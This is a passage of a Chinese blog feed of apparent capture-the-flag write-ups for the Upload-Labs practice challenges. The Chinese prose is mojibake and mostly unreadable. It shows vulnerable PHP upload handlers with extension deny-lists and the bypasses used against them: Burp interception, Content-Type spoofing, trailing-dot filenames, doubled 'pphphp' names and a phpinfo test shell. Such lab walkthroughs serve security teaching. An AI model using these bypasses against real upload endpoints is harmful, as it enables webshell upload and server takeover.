if (!in_array($file_ext, $deny_ext)) {
$temp_file = $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;tmp_name&amp;#39;];
$img_path = UPLOAD_PATH.&amp;#39;/&amp;#39;.$file_name;
if (move_uploaded_file($temp_file, $img_path)) {
$is_upload = true;
} else {
$msg = &amp;#39;ä¸Šä¼ å‡ºé”™ï¼&amp;#39;;
}
} else {
$msg = &amp;#39;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&amp;#39;;
}
} else {
$msg = UPLOAD_PATH . &amp;#39;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&amp;#39;;
}
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;â€‹ è¿™æ¬¡é¢˜ç›®å’Œç¬¬ä¸ƒé¢˜å·®ä¸å¤šï¼Œä»£ç ä¼šå…ˆå‰”é™¤æ–‡ä»¶åå‰åçš„ç©ºæ ¼ï¼Œç„¶ååˆ é™¤æœ«å°¾çš„ç‚¹ï¼Œå†é€šè¿‡&lt;code&gt;strrchr()&lt;/code&gt;å‡½æ•°æˆªå–åç¼€åè½¬æ¢å°å†™ã€‚&lt;/p&gt;
&lt;p&gt;â€‹ æ‰€ä»¥å’Œç¬¬ä¸ƒé¢˜ä¸€æ ·æ„é€ &lt;strong&gt;2333.php. .&lt;/strong&gt;(æœ«å°¾åŠ  ç‚¹ ç©ºæ ¼ ç‚¹)ï¼Œè¢«å¤„ç†åçš„æ–‡ä»¶ååç¼€å°±æˆäº†ä¸€ä¸ªç‚¹&amp;quot;.&amp;quot;ï¼Œé“å®šä¸åœ¨é»‘åå•åç¼€é‡Œï¼Œå®ç°ç»•è¿‡åç¼€æ£€æŸ¥ã€‚&lt;/p&gt;
&lt;p&gt;â€‹ ä½†æ˜¯è¿™é“é¢˜&lt;strong&gt;åªèƒ½ä½¿ç”¨windowsç¯å¢ƒ&lt;/strong&gt;ï¼Œå› ä¸ºæ‰§è¡Œäº†&lt;code&gt;deldot()&lt;/code&gt;å‡½æ•°åˆ é™¤äº†æœ€åä¸€ä¸ªç‚¹ä¹‹åï¼Œæ–‡ä»¶åæˆäº†&lt;code&gt;2333.php.&lt;/code&gt;ï¼Œè€Œlinuxç¯å¢ƒä¸‹å› ä¸ºä¸ä¼šè‡ªåŠ¨åˆ é™¤æœ€åä¸€ä¸ªç‚¹è€Œä¸èƒ½è®¿é—®æˆåŠŸã€‚&lt;/p&gt;
&lt;p&gt;â€‹ å›¾å‰é¢æœ‰äº†å°±ä¸è´´äº†ã€‚&lt;/p&gt;
&lt;h2 id="pass-10"&gt;Pass-10
&lt;/h2&gt;&lt;p&gt;æºç ï¼š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;$is_upload = false;
$msg = null;
if (isset($_POST[&amp;#39;submit&amp;#39;])) {
if (file_exists(UPLOAD_PATH)) {
$deny_ext = array(&amp;#34;php&amp;#34;,&amp;#34;php5&amp;#34;,&amp;#34;php4&amp;#34;,&amp;#34;php3&amp;#34;,&amp;#34;php2&amp;#34;,&amp;#34;html&amp;#34;,&amp;#34;htm&amp;#34;,&amp;#34;phtml&amp;#34;,&amp;#34;pht&amp;#34;,&amp;#34;jsp&amp;#34;,&amp;#34;jspa&amp;#34;,&amp;#34;jspx&amp;#34;,&amp;#34;jsw&amp;#34;,&amp;#34;jsv&amp;#34;,&amp;#34;jspf&amp;#34;,&amp;#34;jtml&amp;#34;,&amp;#34;asp&amp;#34;,&amp;#34;aspx&amp;#34;,&amp;#34;asa&amp;#34;,&amp;#34;asax&amp;#34;,&amp;#34;ascx&amp;#34;,&amp;#34;ashx&amp;#34;,&amp;#34;asmx&amp;#34;,&amp;#34;cer&amp;#34;,&amp;#34;swf&amp;#34;,&amp;#34;htaccess&amp;#34;);
$file_name = trim($_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;name&amp;#39;]);
$file_name = str_ireplace($deny_ext,&amp;#34;&amp;#34;, $file_name);
$temp_file = $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;tmp_name&amp;#39;];
$img_path = UPLOAD_PATH.&amp;#39;/&amp;#39;.$file_name;
if (move_uploaded_file($temp_file, $img_path)) {
$is_upload = true;
} else {
$msg = &amp;#39;ä¸Šä¼ å‡ºé”™ï¼&amp;#39;;
}
} else {
$msg = UPLOAD_PATH . &amp;#39;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&amp;#39;;
}
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;â€‹ è¿™é“é¢˜å’Œå‰é¢ä¸åŒçš„æ˜¯&lt;code&gt;$file_name = str_ireplace($deny_ext,&amp;quot;&amp;quot;, $file_name)&lt;/code&gt;ï¼Œå¯¹äºè¿™ä¸ªå‡½æ•°ï¼š&lt;code&gt;str_ireplace(find,replace,string,count)&lt;/code&gt;ï¼Œfindæ˜¯è¦æŸ¥æ‰¾çš„å€¼ï¼Œreplaceæ˜¯è¦æ›¿æ¢æˆçš„å€¼ï¼Œstringæ˜¯è¢«æœç´¢çš„å­—ç¬¦ä¸²ï¼Œcount å¯é€‰ã€‚ä¸€ä¸ªå˜é‡ï¼Œå¯¹æ›¿æ¢æ•°è¿›è¡Œè®¡æ•°ã€‚æ‰€ä»¥è¿™è¡Œä»£ç çš„ä½œç”¨å°±æ˜¯æŠŠæ–‡ä»¶åä¸­æ‰€æœ‰åŒ…å«åœ¨é»‘åå•åç¼€é‡Œçš„å­—ç¬¦ä¸²æ›¿æ¢æˆç©ºä¸²ï¼Œä½†æ˜¯è¿™ä¸ªå‡½æ•°åªä¼šæ‰§è¡Œä¸€æ¬¡ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ªåŒå†™ç»•è¿‡ï¼Œå³æ„é€ æ–‡ä»¶å&lt;code&gt;2333.pphphp&lt;/code&gt;ï¼Œåªæœ‰ä¸€ä¸ª&amp;quot;php&amp;quot;å­—ç¬¦ä¸²è¢«åŒ¹é…åˆ°å¹¶è¢«æ›¿æ¢æˆç©ºä¸²ï¼Œå‰©ä¸‹çš„æ–‡ä»¶åå°±æˆäº†&lt;code&gt;2333.php&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/09/Bb8yPf.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;ä¸Šä¼ å¹¶è®¿é—®æ–‡ä»¶ã€‚å®Œå·¥&lt;/p&gt;</description></item><item><title>Upload-Labs(ä¸€)</title><link>/posts/ctf/upload-labs1/</link><pubDate>Sun, 08 Nov 2020 19:23:16 +0000</pubDate><guid>/posts/ctf/upload-labs1/</guid><description>&lt;h2 id="ä»‹ç»"&gt;ä»‹ç»
&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;å¤§éƒ¨åˆ†çš„ç½‘ç«™å’Œåº”ç”¨ç³»ç»Ÿéƒ½æœ‰ä¸Šä¼ åŠŸèƒ½ï¼Œè€Œç¨‹åºå‘˜åœ¨å¼€å‘ä»»æ„æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½æ—¶ï¼Œå¹¶æœªè€ƒè™‘æ–‡ä»¶æ ¼å¼åç¼€çš„åˆæ³•æ€§æ ¡éªŒæˆ–è€…æ˜¯å¦åªåœ¨å‰ç«¯é€šè¿‡jsè¿›è¡Œåç¼€æ£€éªŒã€‚è¿™æ—¶æ”»å‡»è€…å¯ä»¥ä¸Šä¼ ä¸€ä¸ªä¸ç½‘ç«™è„šæœ¬è¯­è¨€ç›¸å¯¹åº”çš„æ¶æ„ä»£ç åŠ¨æ€è„šæœ¬ï¼Œä¾‹å¦‚(jspã€aspã€phpã€aspxæ–‡ä»¶åç¼€)åˆ°æœåŠ¡å™¨ä¸Šï¼Œä»è€Œè®¿é—®è¿™äº›æ¶æ„è„šæœ¬ä¸­åŒ…å«çš„æ¶æ„ä»£ç ï¼Œè¿›è¡ŒåŠ¨æ€è§£ææœ€ç»ˆè¾¾åˆ°æ‰§è¡Œæ¶æ„ä»£ç çš„æ•ˆæœï¼Œè¿›ä¸€æ­¥å½±å“æœåŠ¡å™¨å®‰å…¨ã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;åœ¨çº¿é¶æœºåœ°å€ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class="link" href="https://buuoj.cn/challenges#Upload-Labs-Linux" target="_blank" rel="noopener"
&gt;linuxç¯å¢ƒ&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="link" href="https://buuoj.cn/challenges#[Windows]Upload-Labs-Windows" target="_blank" rel="noopener"
&gt;windowsç¯å¢ƒ&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="pass-01"&gt;Pass-01
&lt;/h2&gt;&lt;p&gt;â€‹ å°è¯•ä¸Šä¼ phpæœ¨é©¬ï¼Œå‘ç°æç¤ºä¸Šä¼ é”™è¯¯&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/08/BTKbfs.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;â€‹ æç¤ºåªèƒ½ä¸Šä¼ &lt;code&gt;jpgã€pngã€gif&lt;/code&gt;ç±»å‹çš„å›¾ç‰‡ã€‚æŸ¥çœ‹æºç å‘ç°æ˜¯ä¸€ä¸ªå‰ç«¯çš„åç¼€è¿‡æ»¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°è¯•ç»•è¿‡å‰ç«¯çš„JSä»£ç ã€‚&lt;/p&gt;
&lt;p&gt;â€‹ æºç ï¼š&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-javascript" data-lang="javascript"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;checkFile&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;var&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;file&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; document.&lt;span style="color:#a6e22e"&gt;getElementsByName&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;)[&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;].&lt;span style="color:#a6e22e"&gt;value&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;file&lt;/span&gt; &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;null&lt;/span&gt; &lt;span style="color:#f92672"&gt;||&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;file&lt;/span&gt; &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;&amp;#34;&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;alert&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;//å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;var&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;allow_ext&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;.jpg|.png|.gif&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;//æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;var&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;ext_name&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;file&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;substring&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;file&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;lastIndexOf&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;.&amp;#34;&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;//åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;allow_ext&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;indexOf&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;ext_name&lt;/span&gt; &lt;span style="color:#f92672"&gt;+&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;|&amp;#34;&lt;/span&gt;) &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#f92672"&gt;-&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;var&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;errMsg&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ &amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;+&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;allow_ext&lt;/span&gt; &lt;span style="color:#f92672"&gt;+&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;+&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;ext_name&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;alert&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;errMsg&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;â€‹ æŠŠæ–‡ä»¶åç¼€åæ”¹æˆjpgæ ¼å¼ä¸Šä¼ ï¼Œä½¿ç”¨&lt;strong&gt;burp suit&lt;/strong&gt;æŠ“åŒ…ã€‚æŠŠ&lt;code&gt;.jpg&lt;/code&gt;åç¼€é‡æ–°æ”¹ä¸º&lt;code&gt;.php&lt;/code&gt;å³å¯å®ç°ç»•è¿‡å‰ç«¯JSä»£ç ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/08/BTM5g1.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;â€‹ ç„¶åå³é”®æ‰“å¼€å›¾ç‰‡ï¼Œä»£ç æˆåŠŸæ‰§è¡Œã€‚å®Œå·¥&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/08/BTQV8s.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;â€‹ æ³¨ï¼šåé¢é¢˜ç›®çš„phpä»£ç éƒ½ä½¿ç”¨&lt;code&gt;2333.php&lt;/code&gt;ï¼š&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;eval&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;phpinfo&lt;/span&gt;());
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;â€‹ æ‰§è¡Œç»“æœæ˜¯æ‰“å°å‡ºphpç‰ˆæœ¬ä¿¡æ¯ã€‚&lt;/p&gt;
&lt;h2 id="pass-02"&gt;Pass-02
&lt;/h2&gt;&lt;p&gt;â€‹ æºç ï¼š&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$is_upload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;null&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_POST[&lt;span style="color:#e6db74"&gt;&amp;#39;submit&amp;#39;&lt;/span&gt;])) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;file_exists&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;UPLOAD_PATH&lt;/span&gt;)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (($_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;type&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;image/jpeg&amp;#39;&lt;/span&gt;) &lt;span style="color:#f92672"&gt;||&lt;/span&gt; ($_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;type&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;image/png&amp;#39;&lt;/span&gt;) &lt;span style="color:#f92672"&gt;||&lt;/span&gt; ($_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;type&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;image/gif&amp;#39;&lt;/span&gt;)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $temp_file &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;tmp_name&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $img_path &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;UPLOAD_PATH&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt; $_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;name&amp;#39;&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;move_uploaded_file&lt;/span&gt;($temp_file, $img_path)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $is_upload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;true&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;ä¸Šä¼ å‡ºé”™ï¼&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;UPLOAD_PATH&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;â€‹ å‘ç°æ–‡ä»¶åˆ¤æ–­æ˜¯æ ¹æ®&lt;code&gt;image/jpegã€image/png...&lt;/code&gt;è¿›è¡Œè¿‡æ»¤åˆ¤å®šï¼Œè¿™äº›å€¼éƒ½æ˜¯Httpè¯·æ±‚ä¸­çš„&lt;strong&gt;Content-Type&lt;/strong&gt;å¸¸è§çš„å€¼ï¼Œé€šå¸¸æµè§ˆç½‘é¡µä¸­å„ç§å„æ ·çš„æ–‡ä»¶ç±»å‹çš„å°±æ˜¯é€šè¿‡å®ƒåˆ¤æ–­ã€‚é‚£ä¹ˆè¿™é“é¢˜çš„ç›®æ ‡å°±æ˜¯ç»•è¿‡å®ƒã€‚è´´ä¸€ä¸ªæˆ‘å‚è€ƒå€¼ç§ç±»çš„åšå®¢:&lt;a class="link" href="https://www.cnblogs.com/klb561/p/10090540.html" target="_blank" rel="noopener"
&gt;Httpè¯·æ±‚ä¸­Content-Type&lt;/a&gt;ã€‚&lt;/p&gt;
&lt;p&gt;â€‹ åŒæ ·æ˜¯burpæŠ“åŒ…ä¿®æ”¹&lt;strong&gt;Content-Type&lt;/strong&gt;çš„å€¼ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/08/BT1EXq.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;â€‹ æ‰“å¼€å›¾ç‰‡ï¼Œphpä»£ç æˆåŠŸæ‰§è¡Œã€‚å®Œå·¥&lt;/p&gt;
&lt;h2 id="pass-03"&gt;Pass-03
&lt;/h2&gt;&lt;p&gt;æºç ï¼š&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$is_upload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;null&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_POST[&lt;span style="color:#e6db74"&gt;&amp;#39;submit&amp;#39;&lt;/span&gt;])) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;file_exists&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;UPLOAD_PATH&lt;/span&gt;)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $deny_ext &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;array&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;.asp&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;.aspx&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;.php&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;.jsp&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $file_name &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;trim&lt;/span&gt;($_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;name&amp;#39;&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $file_name &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;deldot&lt;/span&gt;($file_name);&lt;span style="color:#75715e"&gt;//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; $file_ext &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;strrchr&lt;/span&gt;($file_name, &lt;span style="color:#e6db74"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $file_ext &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;strtolower&lt;/span&gt;($file_ext); &lt;span style="color:#75715e"&gt;//è½¬æ¢ä¸ºå°å†™
